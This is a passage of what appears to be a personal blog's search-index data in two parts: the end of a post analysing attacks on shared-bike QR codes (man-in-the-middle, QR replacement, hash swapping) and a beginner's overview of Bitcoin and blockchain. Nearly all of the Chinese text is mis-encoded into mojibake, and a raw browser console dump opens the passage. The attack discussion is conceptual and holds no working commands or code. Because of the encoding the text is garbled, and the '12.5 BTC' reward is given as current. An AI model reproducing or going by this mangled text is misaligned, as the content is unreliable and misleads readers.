from: \"webapp\" imei: \"\" lang: \"zh-CN\" law_checked: false origin_id: \"1\" role: 1 scene: 3 showCodeSign: false styleObj: Object { } useOauthCode: false \u003cprototype\u003e: Object { â€¦ } login.min.js:1:36888 æ˜æ˜¾çš„ä¸€ä¸ªpostè¯·æ±‚ï¼Œè€Œä¸”é‡‡ç”¨äº†httpsï¼Œä¸å¥½æŠ“åŒ…\nä½†æ˜¯é¢„æµ‹æ˜¯è·³è½¬è‡³å°ç¨‹åºï¼Œå±äºå¾®ä¿¡å°ç¨‹åºçš„ã€‚\n æ‰‹æœºæŠ“åŒ…å·¥å…·ï¼šfiddlerï¼Œfrida\n é€šè¿‡ä»¥ä¸Šå¯å‘ç°ï¼Œå…±äº«å•è½¦çš„äºŒç»´ç å¤§å¤šéƒ½æ˜¯é€šè¿‡äºŒç»´ç çš„urlæ ¼å¼å­˜å‚¨ï¼Œç„¶åé€šè¿‡urlè®¿é—®åˆ¤æ–­å…¶user-Agentæ¨æµ‹å‡ºä½¿ç”¨çš„æµè§ˆå™¨ï¼Œç„¶ååšä¸åŒçš„è·¯ç”±å¤„ç†æˆ–ä½¿ç”¨è‡ªèº«åè®®ï¼Œå¦‚alipays://\nå…³äºå¯†ç å­¦ä¸äºŒç»´ç çš„æ€è€ƒ åœ¨äºŒç»´ç å¤šå­˜å…¥è¯ä¹¦ï¼Œå­˜å‚¨çš„æ•°æ®é‡åº”è¯¥ä¼šå˜å¤§ï¼Œä½†æ˜¯ä¸è‡³äºå­˜ä¸ä¸‹ï¼Œä½†æ˜¯è¿™æ˜¯æ²¡æœ‰å¿…è¦çš„ã€‚\nå½“æ‰«å®ŒäºŒç»´ç è®¿é—®å…¶æŒ‡å‘çš„urlæ—¶ï¼Œè¯¥è¯·æ±‚å·²å‘ocspè¯·æ±‚åœ¨çº¿è¯ä¹¦äº†ï¼›è€Œä¸”è¯¥ç§æ–¹æ³•ä¹Ÿæ— æ³•é¿å…ä¸­é—´äººæ”»å‡»ã€‚ï¼ˆå‚è€ƒhttpsçš„sslä¸­é—´äººæ”»å‡»ï¼‰\n httpsä¸­çš„sslä¸­é—´äººæ”»å‡»\né€šè¿‡ä¼ªé€ CAè¯ä¹¦ï¼Œå®ç°SSLä¸­é—´äººæ”»å‡»\nSSL,TLSä¸­é—´äººæ”»å‡»\nHTTPSä¸­é—´äººæ”»å‡»å®è·µï¼ˆåŸç†Â·å®è·µï¼‰\n è‡³äºäºŒç»´ç æ›¿æ¢æ›´åŠ æ— å¯é¿å…ï¼Œå› æ­¤è¿˜æ˜¯é‡‡ç”¨ä¿¡ä»»å¯ä¿¡ç¬¬ä¸‰æ–¹çš„(å®˜æ–¹appï¼Œä»¥åŠæœ‰åˆä½œçš„app)æ–¹æ³•æ¯”è¾ƒå®‰å…¨ã€‚ï¼ˆå› ä¸ºå…¶ç”¨çš„æ˜¯è·¯ç”±åˆ¤æ–­ï¼Œä¸å­˜åœ¨å‡çš„urlèƒ½è·³è½¬ï¼‰\nå…¶æ¬¡ï¼Œå‡å¦‚åœ¨äºŒç»´ç ä¸­åŠ å…¥hashåˆ¤æ–­ï¼Œä¹Ÿæ˜¯ä¸å¯è¡Œçš„ã€‚å› ä¸ºå¯†ç å­¦ä¸èƒ½ä¾èµ–äºä¸å…¬å¼€çš„ç®—æ³•ï¼Œè€Œä¸”å¯ä»¥é€šè¿‡æš´åŠ›åŒ¹é…ç®—å‡ºhashç®—æ³•çš„æµç¨‹ã€‚å› æ­¤å¾—çŸ¥æµç¨‹ï¼Œå°†å‡urlå’Œå‡urlçš„hashä¸€èµ·æ›¿æ¢åŸurlä»¥åŠå…¶hashä¾¿å¯äº§ç”Ÿæ”»å‡»ã€‚\n","description":"Something about QRCode.","tags":["QRCode"],"title":"QRCodeAttack","uri":"/posts/qrcodeattack/"},{"categories":["crypto"],"content":"Bitcoin æ•°å­—è´§å¸å’Œçº¸è´¨è´§å¸çš„å¯¹æ¯”    å±æ€§ åˆ†æ ä¼˜åŠ¿æ–¹     ä¾¿æº å¤§éƒ¨åˆ†åœºæ™¯ï¼ˆç‰¹åˆ«æ˜¯è¾ƒå¤§æ•°é¢æ”¯ä»˜æ—¶ï¼‰ä¸‹æ•°å­—è´§å¸å°†å…·å¤‡æ›´å¥½çš„ä¾¿æºæ€§ æ•°å­—è´§å¸   é˜²ä¼ª ä¸¤è€…å„æœ‰åƒç§‹ï¼Œä½†æ•°å­—è´§å¸æ•´ä½“ä¸Šä¼šç•¥èƒœä¸€ç­¹ã€‚ çº¸å¸ä¾é çš„æ˜¯å„ç§è®¾è®¡ï¼ˆçº¸å¼ ã€æ²¹å¢¨ ã€é˜²ä¼ª æš—çº¹ ã€ å¤¹å±‚ç­‰ï¼‰ä¸Šçš„ç²¾å·§ï¼Œæ•°å­—è´§å¸ä¾é çš„åˆ™æ˜¯å¯†ç å­¦ä¸Šçš„ä¿éšœã€‚ äº‹å®ä¸Šï¼Œçº¸å¸çš„ä¼ªé€ æ—¶æœ‰å‘ç”Ÿï¼Œä½†æ•°å­—è´§å¸çš„ä¼ªé€ ç›®å‰è¿˜æ— æ³•å®ç° æ•°å­—è´§å¸   è¾¨ä¼ª çº¸å¸å³ä½¿ä¾æ‰˜éªŒé’æœºç­‰ä¸“ç”¨è®¾å¤‡ä»ä¼šæœ‰è¯¯åˆ¤æƒ…å†µï¼Œæ•°å­—è´§å¸ä¾é å¯†ç å­¦æ˜“äºæ ¡éªŒ æ•°å­—è´§å¸   åŒ¿å é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸¤è€…éƒ½èƒ½æä¾›å¾ˆå¥½çš„åŒ¿åæ€§ ã€‚ ä½†éƒ½æ— æ³•é˜²å¾¡æœ‰æ„çš„è¿½è¸ª æŒå¹³   äº¤æ˜“ å¯¹çº¸å¸æ¥è¯´ï¼Œè°æŒæœ‰çº¸å¸è°å°±æ˜¯åˆæ³•æ‹¥æœ‰è€…ï¼Œäº¤æ˜“é€šè¿‡çº¸å¸è‡ªèº«çš„è½¬ç§»å³å¯å®Œæˆï¼Œæ— æ³•å¤åˆ¶ ã€‚ å¯¹æ•°å­—è´§å¸æ¥è¯´åˆ™å¤æ‚å¾—å¤šï¼Œå› ä¸ºä»»ä½•æ•°å­—ç‰©å“éƒ½æ˜¯å¯ä»¥è¢«å¤åˆ¶çš„ï¼Œä½†æ•°å­— å½¢å¼ä¹Ÿæ„å‘³ç€è½¬ç§»æˆæœ¬ä¼šæ›´ä½ ã€‚ æ€»ä½“ä¸Šçœ‹ï¼Œä¸¤è€…é€‚ç”¨ä¸åŒçš„æƒ…æ™¯ æŒå¹³   èµ„æº é€šå¸¸æƒ…å†µä¸‹ï¼Œçº¸å¸çš„ç”Ÿäº§æˆæœ¬è¦è¿œä½äºé¢é¢ã€‚ æ•°å­—è´§å¸æ¶ˆè€—èµ„æºçš„è®¡ç®—åˆ™å¤æ‚å¾—å¤š ã€‚ ä»¥æ¯”ç‰¹å¸ä¸ºä¾‹ï¼Œæœ€åæƒ…å†µä¸‹å¯èƒ½éœ€è¦æ¶ˆè€—æ¥è¿‘ç”šè‡³è¶…è¿‡é¢å€¼çš„ç”µèƒ½ æŒå¹³   å‘è¡Œ çº¸å¸çš„å‘è¡Œéœ€è¦ç¬¬ä¸‰æ–¹æœºæ„çš„å‚ä¸ï¼Œæ•°å­—è´§å¸åˆ™é€šè¿‡åˆ†å¸ƒå¼ç®—æ³•æ¥å®Œæˆå‘è¡Œã€‚ åœ¨äººç±»å†å²ä¸Šï¼Œé€šèƒ€å’Œé€šç¼©å¾€å¾€æ˜¯ä¸åˆç†åœ°å‘è¡Œè´§å¸é€ æˆçš„ï¼Œè€Œæ•°å­—è´§å¸å°šç¼ºä¹å¤§è§„æ¨¡éªŒè¯ï¼Œ è¿˜æœ‰å¾…è§‚å¯Ÿ æŒå¹³   ç®¡ç† çº¸å¸å‘è¡Œå’Œå›æ”¶å¾€å¾€é€šè¿‡ç»Ÿä¸€æœºæ„ï¼Œæ˜“äºç›‘ç®¡å’Œå®¡è®¡ï¼›ç›®å‰å‡ºç°çš„æ•°å­—è´§å¸åœ¨è¿™æ–¹é¢ è¿˜ç¼ºä¹è¶³å¤Ÿæ”¯æŒå’ŒéªŒè¯ çº¸å¸    åŒé‡æ”¯ä»˜æ”»å‡» å¯¹äºæ•°å­—è´§å¸æ¥è¯´ï¼Œæ•°å­—åŒ–å†…å®¹å®¹æ˜“è¢«å¤åˆ¶ã€‚æ•°å­—è´§å¸æŒæœ‰äººå¯ä»¥å°†åŒä¸€ä»½è´§å¸å‘ç»™å¤šä¸ªæ¥æ”¶è€…ï¼Œè¿™ç§æ”»å‡»ç§°ä¸ºâ€œåŒé‡æ”¯ä»˜æ”»å‡»â€ã€‚\næ•°å­—è´§å¸1.0ï¼šå³é“¶è¡Œä¸­é€šè¿‡ç”µå­è´¦å·é‡Œé¢çš„æ•°å­—è®°å½•äº†å®¢æˆ·çš„èµ„äº§\nä½†ä»–ä¾èµ–äºä¸€ä¸ªå‰æï¼šå‡å®šå­˜åœ¨ä¸€ä¸ªå®‰å…¨å¯é çš„ç¬¬ä¸‰æ–¹è®°è´¦æœºæ„è´Ÿè´£è®°è´¦ï¼Œè¿™ä¸ªæœºæ„è´Ÿè´£æ‰€æœ‰çš„æ‹…ä¿ç¯èŠ‚ï¼Œæœ€ç»ˆå®Œæˆäº¤æ˜“ã€‚\né“¶è¡Œã€æ”¯ä»˜å®éƒ½å±äºè¿™ç§ç±»å‹ã€‚\nå»ä¸­å¿ƒåŒ–çš„æŠ€æœ¯éš¾å…³  è´§å¸çš„é˜²ä¼ªï¼šè°è´Ÿè´£å¯¹è´§å¸çš„çœŸä¼ªè¿›è¡Œé‰´å®š è´§å¸çš„äº¤æ˜“ï¼šå¦‚ä½•ç¡®ä¿è´§å¸ä»ä¸€æ–¹å®‰å…¨è½¬ç§»åˆ°å¦å¤–ä¸€æ–¹ é¿å…åŒé‡æ”¯ä»˜ï¼šå¦‚ä½•é¿å…åŒä¸€ä»½è´§å¸æ”¯ä»˜ç»™å¤šä¸ªæ¥æ”¶è€…  æ•°å­—è´§å¸çš„å®šä¹‰ æ•°å­—è´§å¸å¯ä»¥è®¤ä¸ºæ˜¯ä¸€ç§åŸºäºèŠ‚ç‚¹ç½‘ç»œå’Œæ•°å­—åŠ å¯†ç®—æ³•çš„è™šæ‹Ÿè´§å¸ã€‚æ•°å­—è´§å¸çš„æ ¸å¿ƒç‰¹å¾ä¸»è¦ä½“ç°åœ¨ä¸‰ä¸ªæ–¹é¢ï¼š\nâ‘ ç”±äºæ¥è‡ªäºæŸäº›å¼€æ”¾çš„ç®—æ³•ï¼Œæ•°å­—è´§å¸æ²¡æœ‰å‘è¡Œä¸»ä½“ï¼Œå› æ­¤æ²¡æœ‰ä»»ä½•äººæˆ–æœºæ„èƒ½å¤Ÿæ§åˆ¶å®ƒçš„å‘è¡Œï¼›\nâ‘¡ç”±äºç®—æ³•è§£çš„æ•°é‡ç¡®å®šï¼Œæ‰€ä»¥æ•°å­—è´§å¸çš„æ€»é‡å›ºå®šï¼Œè¿™ä»æ ¹æœ¬ä¸Šæ¶ˆé™¤äº†è™šæ‹Ÿè´§å¸æ»¥å‘å¯¼è‡´çš„å¯èƒ½ï¼›\nâ‘¢ç”±äºäº¤æ˜“è¿‡ç¨‹éœ€è¦ç½‘ç»œä¸­çš„å„ä¸ªèŠ‚ç‚¹çš„è®¤å¯ï¼Œå› æ­¤æ•°å­—è´§å¸çš„äº¤æ˜“è¿‡ç¨‹è¶³å¤Ÿå®‰å…¨ ã€‚\næ•°å­—è´§å¸æ˜¯ä¸€ç§ä¸å—ç®¡åˆ¶çš„ã€æ•°å­—åŒ–çš„è´§å¸ï¼Œé€šå¸¸ç”±å¼€å‘è€…å‘è¡Œå’Œç®¡ç†ï¼Œè¢«ç‰¹å®šè™šæ‹Ÿç¤¾åŒºçš„æˆå‘˜æ‰€æ¥å—å’Œä½¿ç”¨ã€‚æ¬§æ´²é“¶è¡Œä¸šç®¡ç†å±€å°†è™šæ‹Ÿè´§å¸å®šä¹‰ä¸ºï¼šä»·å€¼çš„æ•°å­—åŒ–è¡¨ç¤ºï¼Œä¸ç”±å¤®è¡Œæˆ–å½“å±€å‘è¡Œï¼Œä¹Ÿä¸ä¸æ³•å¸æŒ‚é’©ï¼Œä½†ç”±äºè¢«å…¬ä¼—æ‰€æ¥å—ï¼Œæ‰€ä»¥å¯ä½œä¸ºæ”¯ä»˜æ‰‹æ®µï¼Œä¹Ÿå¯ä»¥ç”µå­å½¢å¼è½¬ç§»ã€å­˜å‚¨æˆ–äº¤æ˜“\næ¯”ç‰¹å¸çš„è¯ç”Ÿ 2008 å¹´ 10 æœˆ 31 æ—¥ï¼Œ ä¸€ä½åŒ–å Satoshi Nakamoto ï¼ˆä¸­æœ¬èªï¼‰çš„äººåœ¨ metzdowd å¯†ç å­¦é‚®ä»¶åˆ—è¡¨ä¸­æå‡ºäº†æ¯”ç‰¹å¸ï¼ˆ Bitcoinï¼‰çš„è®¾è®¡ç™½çš®ä¹¦ã€Š Bitcoin: A Peer-to-Peer Electronic Cash System ã€‹ï¼Œå¹¶åœ¨2009 å¹´å…¬å¼€äº†æœ€åˆçš„å®ç°ä»£ç  ã€‚\næ¯”ç‰¹å¸çš„æ„ä¹‰å’Œä»·å€¼ æ¯”ç‰¹å¸é¦–æ¬¡çœŸæ­£ä»å®è·µæ„ä¹‰ä¸Šå®ç°äº†å®‰å…¨å¯é çš„å»ä¸­å¿ƒåŒ–æ•°å­—è´§å¸æœºåˆ¶ ï¼Œè¿™ä¹Ÿæ˜¯å®ƒå—åˆ°æ— æ•°é‡‘èç§‘æŠ€ä»ä¸šè€…çƒ­æ§çš„æ ¹æœ¬åŸå›  ã€‚\n ä½œä¸ºä¸€ç§æ¦‚å¿µè´§å¸ï¼Œæ¯”ç‰¹å¸ä¸»è¦å¸Œæœ›è§£å†³å·²æœ‰è´§å¸ç³»ç»Ÿé¢ä¸´çš„å‡ ä¸ªæ ¸å¿ƒé—®é¢˜ï¼š  è¢«æŒæ§åœ¨å•ä¸€æœºæ„æ‰‹ä¸­ï¼Œå®¹æ˜“è¢«æ”»å‡» è‡ªèº«çš„ä»·å€¼æ— æ³•ä¿è¯ï¼Œå®¹æ˜“å‡ºç°æ³¢åŠ¨ æ— æ³•åŒ¿ååŒ–äº¤æ˜“ï¼Œä¸å¤Ÿéšç§    æ¯”ç‰¹å¸çš„ç”Ÿæ€ç³»ç»Ÿå¦‚ä¸‹ï¼š åŒºå—é“¾å› æ¯”ç‰¹å¸è€Œç”Ÿï¼Œä½†æ˜¯ç°åœ¨å·²ç»è„±ç¦»äº†æ¯”ç‰¹å¸ç½‘ç»œè‡ªèº«ã€‚\nBlock Chain åŒºå—é“¾æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„æ•°æ®åº“ï¼Œåˆä¸ä»…ä»…æ˜¯ä¸€ä¸ªæ•°æ®åº“ã€‚æ˜¯ä¸€ä¸²ä½¿ç”¨å¯†ç å­¦æ–¹æ³•ç›¸å…³è”äº§ç”Ÿçš„æ•°æ®å—ï¼Œæ¯ä¸€ä¸ªæ•°æ®å—ä¸­åŒ…å«äº†ä¸€ç»„æ¯”ç‰¹å¸ç½‘ç»œäº¤æ˜“çš„ä¿¡æ¯ï¼Œç”¨äºéªŒè¯å…¶ä¿¡æ¯çš„æœ‰æ•ˆæ€§(é˜²ä¼ª)å’Œç”Ÿæˆä¸‹ä¸€ä¸ªåŒºå—ã€‚\n2015å¹´è¢«ä¸šç•Œè§†ä¸ºåŒºå—é“¾å…ƒå¹´ï¼Œ2016å¹´åˆ™æ˜¯åŒºå—é“¾äº§ä¸šæ·±åŒ–å‘å±•å’Œå…¨é¢åŠ é€Ÿå‰è¡Œçš„ä¸€å¹´ï¼Œ2019å¹´ä¸ºâ€œä¸Šé“¾å…ƒå¹´â€ã€‚\n åŒºå—é“¾çš„ç‰¹ç‚¹  åˆ†å¸ƒå¼å®¹é”™æ€§ï¼šåˆ†å¸ƒå¼ç½‘ç»œåŠå…¶é²æ£’ï¼Œèƒ½å¤Ÿå®¹å¿éƒ¨åˆ†èŠ‚ç‚¹çš„å¼‚å¸¸çŠ¶æ€ ä¸å¯ç¯¡æ”¹æ€§ï¼šä¸€è‡´æäº¤åçš„æ•°æ®ä¼šä¸€ç›´å­˜åœ¨ï¼Œä¸å¯é”€æ¯å’Œä¿®æ”¹ éšç§ä¿æŠ¤æ€§ï¼šå¯†ç å­¦ä¿è¯äº†æ•°æ®éšç§ï¼Œå³ä¾¿æ•°æ®æ³„éœ²ä¹Ÿæ— æ³•è§£æ   éšä¹‹å¸¦æ¥çš„ä¸šåŠ¡ç‰¹æ€§  å¯ä¿¡ä»»æ€§ï¼šåŒºå—é“¾æŠ€æœ¯å¯ä»¥æä¾›å¤©ç„¶å¯ä¿¡çš„åˆ†å¸ƒå¼è´¦æœ¬å¹³å°ï¼Œä¸éœ€è¦é¢å¤–çš„ç¬¬ä¸‰æ–¹ä¸­ä»‹æœºæ„å‚ä¸ é™ä½æˆæœ¬ï¼šè·Ÿä¼ ç»ŸæŠ€æœ¯ç›¸æ¯”ï¼ŒåŒºå—é“¾æŠ€æœ¯å¯èƒ½éœ€è¦æ—¶é—´ã€äººåŠ›å’Œç»´æŠ¤æˆæœ¬æ›´å°‘ å¢å¼ºå®‰å…¨ï¼šåŒºå—é“¾æŠ€æœ¯å°†æœ‰åˆ©äºå®‰å…¨ã€å¯é çš„å®¡è®¡ç®¡ç†å’Œè´¦ç›®æ¸…ç®—ï¼Œå‡å°‘çŠ¯ç½ªé£é™©    æ‰€æœ‰è·Ÿä¿¡æ¯ã€ä»·å€¼ã€ä¿¡ç”¨ç­‰ç›¸å…³çš„äº¤æ¢è¿‡ç¨‹ï¼Œéƒ½å°†å¯èƒ½ä»åŒºå—é“¾æŠ€æœ¯ä¸­å¾—åˆ°å¯å‘æˆ–ç›´æ¥å—ç›Šã€‚\nWikipediaçš„å®šä¹‰ï¼šæ˜¯å€Ÿç”±å¯†ç å­¦ä¸²æ¥å¹¶ä¿æŠ¤å†…å®¹çš„ä¸²è¿æ–‡å­—è®°å½•ã€‚ç±»æ¯”äºä¸€ç§åˆ†å¸ƒå¼æ•°æ®åº“æŠ€æœ¯ï¼Œé€šè¿‡ç»´æŠ¤æ•°æ®å—çš„é“¾å¼ç»“æ„ï¼Œå¯ä»¥ç»´æŒæŒç»­å¢é•¿çš„ã€ä¸å¯ç¯¡æ”¹çš„æ•°æ®è®°å½•ã€‚\nåŒºå—é“¾æŠ€æœ¯æœ€æ—©çš„åº”ç”¨å‡ºç°åœ¨æ¯”ç‰¹å¸é¡¹ç›®ä¸­ã€‚\nåŸºæœ¬æ¦‚å¿µï¼š\n äº¤æ˜“ï¼ˆtransactionï¼‰ï¼šä¸€æ¬¡å¯¹è´¦æœ¬çš„æ“ä½œï¼Œå¯¼è‡´è´¦æœ¬çŠ¶æ€çš„ä¸€æ¬¡æ”¹å˜ï¼Œå¦‚æ·»åŠ ä¸€æ¡è½¬è´¦è®°å½• åŒºå—ï¼ˆblockï¼‰ï¼šè®°å½•ä¸€æ®µæ—¶é—´å†…å‘ç”Ÿçš„æ‰€æœ‰äº¤æ˜“å’ŒçŠ¶æ€ç»“æœï¼Œæ˜¯å¯¹å½“å‰è´¦æœ¬çŠ¶æ€çš„ä¸€æ¬¡å…±è¯† é“¾ï¼ˆchainï¼‰ï¼šç”±åŒºå—æŒ‰ç…§å‘ç”Ÿé¡ºåºä¸²è”è€Œæˆï¼Œæ˜¯æ•´ä¸ªè´¦æœ¬çŠ¶æ€å˜åŒ–çš„æ—¥å¿—è®°å½•  è‹¥æŠŠåŒºå—é“¾ä½œä¸ºä¸€ä¸ªçŠ¶æ€æœºï¼Œåˆ™æ¯ä¸€æ¬¡äº¤æ˜“æ˜¯è§†å›¾æ”¹å˜ä¸€æ¬¡çŠ¶æ€ï¼Œè€Œæ¯æ¬¡å…±è¯†ç”Ÿæˆçš„åŒºå—ï¼Œå°±æ˜¯å‚ä¸è€…å¯¹äºåŒºå—ä¸­äº¤æ˜“å¯¼è‡´çŠ¶æ€çš„æ”¹å˜çš„ç»“æœè¿›è¡Œç¡®è®¤ã€‚\nåœ¨å®ç°ä¸Šï¼Œé¦–å…ˆå‡è®¾å­˜åœ¨ä¸€ä¸ªåˆ†å¸ƒå¼çš„æ•°æ®è®°å½•è´¦æœ¬ï¼Œè¿™ä¸ªè´¦æœ¬åªå…è®¸æ·»åŠ  ã€ ä¸å…è®¸åˆ é™¤ ã€‚ è´¦æœ¬åº•å±‚çš„åŸºæœ¬ç»“æ„æ˜¯ä¸€ä¸ªçº¿æ€§çš„é“¾è¡¨ï¼Œè¿™ä¹Ÿæ˜¯å…¶åå­—â€œåŒºå—é“¾â€çš„æ¥æº ã€‚\né“¾è¡¨ç”±ä¸€ä¸ªä¸ªâ€œåŒºå—â€ä¸²è”ç»„æˆï¼Œåç»§åŒºå—è®°å½•å‰å¯¼åŒºå—çš„å“ˆå¸Œå€¼ï¼ˆ pre hash ï¼‰ ã€‚ æ–°çš„æ•°æ®è¦åŠ å…¥ï¼Œå¿…é¡»æ”¾åˆ°ä¸€ä¸ªæ–°çš„åŒºå—ä¸­ ã€‚ è€Œè¿™ä¸ªå—ï¼ˆä»¥åŠå—é‡Œçš„äº¤æ˜“ï¼‰æ˜¯å¦åˆæ³•ï¼Œå¯ä»¥é€šè¿‡è®¡ç®—å“ˆå¸Œå€¼çš„æ–¹å¼å¿«é€Ÿæ£€éªŒå‡ºæ¥ ã€‚ ä»»æ„ç»´æŠ¤èŠ‚ç‚¹éƒ½å¯ä»¥æè®®ä¸€ä¸ªæ–°çš„åˆæ³•åŒºå—ï¼Œç„¶è€Œå¿…é¡»ç»è¿‡ä¸€å®šçš„å…±è¯†æœºåˆ¶æ¥å¯¹æœ€ç»ˆé€‰æ‹©çš„åŒºå—è¾¾æˆä¸€è‡´ã€‚\n  æ¯”ç‰¹å¸ä¸ºä¾‹ï¼ŒåŒºå—é“¾çš„å…±ç»„è¿‡ç¨‹    æ¯”ç‰¹å¸å®¢æˆ·ç«¯å‘èµ·ä¸€é¡¹äº¤æ˜“ï¼Œå¹¿æ’­åˆ°æ¯”ç‰¹å¸ç½‘ç»œä¸­å¹¶ç­‰å¾…ç¡®è®¤ ã€‚\n  ç½‘ç»œä¸­çš„èŠ‚ç‚¹ä¼šå°†ä¸€äº›æ”¶åˆ°çš„ç­‰å¾…ç¡®è®¤çš„äº¤æ˜“è®°å½•æ‰“åŒ…åœ¨ä¸€èµ·ï¼ˆæ­¤å¤–è¿˜è¦åŒ…æ‹¬å‰ä¸€ä¸ªåŒºå—å¤´éƒ¨çš„å“ˆå¸Œå€¼ç­‰ä¿¡æ¯ï¼‰ï¼Œç»„æˆä¸€ä¸ªå€™é€‰åŒºå— ã€‚\n  è¯•å›¾æ‰¾åˆ°ä¸€éšæœºä¸²æ”¾åˆ°åŒºå—é‡Œï¼Œä½¿å¾—å€™é€‰åŒºå—çš„å“ˆå¸Œç»“æœæ»¡è¶³ä¸€å®šæ¡ä»¶ï¼ˆæ¯”å¦‚å°äºæŸä¸ªå€¼ï¼‰ ã€‚ è¿™ä¸ª nonce ä¸²çš„æŸ¥æ‰¾éœ€è¦ä¸€å®šçš„æ—¶é—´å»è¿›è¡Œè®¡ç®—å°è¯•ã€‚\n  ä¸€æ—¦èŠ‚ç‚¹ç®—å‡ºæ¥æ»¡è¶³æ¡ä»¶çš„ nonce ä¸²ï¼Œè¿™ä¸ªåŒºå—åœ¨æ ¼å¼ä¸Šå°±è¢«è®¤ä¸ºæ˜¯â€œåˆæ³•â€äº†ï¼Œå°±å¯ä»¥å°è¯•åœ¨ç½‘ç»œä¸­å°†å®ƒå¹¿æ’­å‡ºå» ã€‚\n  å…¶ä»–èŠ‚ç‚¹æ”¶åˆ°å€™é€‰åŒºå—ï¼Œè¿›è¡ŒéªŒè¯ï¼Œå‘ç°ç¡®å®ç¬¦åˆçº¦å®šæ¡ä»¶äº†ï¼Œå°±æ‰¿è®¤è¿™ä¸ªåŒºå—æ˜¯ä¸€ä¸ªåˆæ³•çš„æ–°åŒºå—ï¼Œå¹¶æ·»åŠ åˆ°è‡ªå·±ç»´æŠ¤çš„åŒºå—é“¾ä¸Š ã€‚\n  å½“å¤§éƒ¨åˆ†èŠ‚ç‚¹éƒ½å°†åŒºå—æ·»åŠ åˆ°è‡ªå·±ç»´æŠ¤çš„åŒºå—é“¾ç»“æ„ä¸Šæ—¶ï¼Œè¯¥åŒºå—è¢«ç½‘ç»œæ¥å—ï¼ŒåŒºå—ä¸­æ‰€åŒ…æ‹¬çš„äº¤æ˜“ä¹Ÿå°±å¾—åˆ°ç¡®è®¤ ã€‚\n   å¦‚å›¾ï¼ŒAæƒ³è¦å‘Bå‘èµ·äº¤æ˜“ï¼ˆ1ï¼Œ2ï¼‰ï¼Œåšå·¥ä½œé‡è¯æ˜ï¼Œç„¶åå°†äº¤æ˜“å¹¿æ’­è‡³åŒºå—é“¾ç½‘ç»œä¸­ï¼ˆ3ï¼‰ï¼Œè®©å…¶ä»–èŠ‚ç‚¹éªŒè¯å·¥ä½œé‡è¯æ˜ï¼ˆ4ï¼‰ï¼ŒéªŒè¯æˆåŠŸåï¼Œå°†äº¤æ˜“åŒºå—åŠ å…¥è¯¥é“¾çš„æœ«å°¾ï¼ˆ5ï¼‰ï¼Œäº¤æ˜“æˆåŠŸï¼ˆ6ï¼‰ã€‚\nå·¥ä½œé‡è¯æ˜ Proof of Workï¼šç®€ç§°PoWï¼Œå³å·¥ä½œé‡è¯æ˜ã€‚æ¯”ç‰¹å¸çš„è¿™ç§åŸºäºç®—åŠ›å¯»æ‰¾ nonce ä¸²çš„å…±è¯†æœºåˆ¶ã€‚ ç›®å‰ï¼Œè¦è®©å“ˆå¸Œç»“æœæ»¡è¶³ä¸€å®šæ¡ä»¶ï¼Œå¹¶æ— å·²çŸ¥çš„å¿«é€Ÿå¯å‘å¼ç®—æ³•ï¼Œåªèƒ½è¿›è¡Œå°è¯•æ€§çš„æš´åŠ›è®¡ç®— ã€‚ å°è¯•çš„æ¬¡æ•°è¶Šå¤šï¼ˆå·¥ä½œé‡è¶Šå¤§ï¼‰ï¼Œç®—å‡ºæ¥çš„æ¦‚ç‡è¶Šå¤§ ã€‚\né€šè¿‡è°ƒèŠ‚å¯¹å“ˆå¸Œç»“æœçš„é™åˆ¶ï¼Œæ¯”ç‰¹å¸ç½‘ç»œæ§åˆ¶å¹³å‡çº¦ 10 åˆ†é’Ÿäº§ç”Ÿä¸€ä¸ªåˆæ³•åŒºå— ã€‚ ç®—å‡ºåŒºå—çš„èŠ‚ç‚¹å°†å¾—åˆ°åŒºå—ä¸­æ‰€æœ‰äº¤æ˜“çš„ç®¡ç†è´¹å’Œåè®®å›ºå®šå‘æ”¾çš„å¥–åŠ±è´¹ï¼ˆç›®å‰æ˜¯ 12.5 æ¯”ç‰¹å¸ï¼Œæ¯å››å¹´å‡åŠï¼‰ï¼Œè¿™ä¸ªè®¡ç®—æ–°åŒºå—çš„è¿‡ç¨‹ä¿—ç§°ä¸ºæŒ–çŸ¿ ã€‚\næ¯”ç‰¹å¸ç½‘ç»œä¸­å­˜åœ¨å¤§é‡ï¼ˆæ®ä¼°è®¡æ•°åƒä¸ªï¼‰çš„ç»´æŠ¤èŠ‚ç‚¹ï¼Œè€Œä¸”å¤§éƒ¨åˆ†èŠ‚ç‚¹éƒ½æ˜¯æ­£å¸¸å·¥ä½œçš„ï¼Œé»˜è®¤éƒ½åªæ‰¿è®¤æ‰€çœ‹åˆ°çš„æœ€é•¿çš„é“¾ç»“æ„ ã€‚ åªè¦ç½‘ç»œä¸­ä¸å­˜åœ¨è¶…è¿‡ä¸€åŠçš„èŠ‚ç‚¹æå‰å‹¾ç»“ä¸€èµ·é‡‡å–æ¶æ„è¡ŒåŠ¨ï¼Œåˆ™æœ€é•¿çš„é“¾å°†å¾ˆå¤§æ¦‚ç‡ä¸Šæˆä¸ºæœ€ç»ˆåˆæ³•çš„é“¾ ã€‚ è€Œä¸”éšç€æ—¶é—´å¢åŠ ï¼Œè¿™ä¸ªæ¦‚ç‡ä¼šè¶Šæ¥è¶Šå¤§ã€‚ ä¾‹å¦‚ï¼Œç»è¿‡ 6 ä¸ªåŒºå—ç”Ÿæˆåï¼Œå³ä¾¿æœ‰ä¸€åŠçš„èŠ‚ç‚¹è”åˆèµ·æ¥æƒ³é¢ è¦†è¢«çš„ç»“æœï¼Œå…¶æ¦‚ç‡ä¹Ÿä»…ä¸ºï¼ˆ1/2)6 = 1.6% ï¼Œå³ä½äº 1 /60 çš„å¯èƒ½æ€§ ã€‚å½“ç„¶ï¼Œå¦‚æœæ•´ä¸ªç½‘ç»œä¸­å¤§å¤šæ•°çš„èŠ‚ç‚¹éƒ½è”åˆèµ·æ¥ä½œæ¶ï¼Œå¯ä»¥å¯¼è‡´æ•´ä¸ªç³»ç»Ÿæ— æ³•æ­£å¸¸å·¥ä½œ ã€‚ è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œå¾€å¾€æ„å‘³ç€ä»˜å‡ºå¾ˆå¤§çš„ä»£ä»·ï¼Œè·Ÿé€šè¿‡ä½œæ¶å¾—åˆ°çš„æ”¶ç›Šç›¸æ¯”ï¼Œå¾—ä¸å¿å¤± ã€‚\nåŒºå—é“¾çš„æ¼”åŒ–   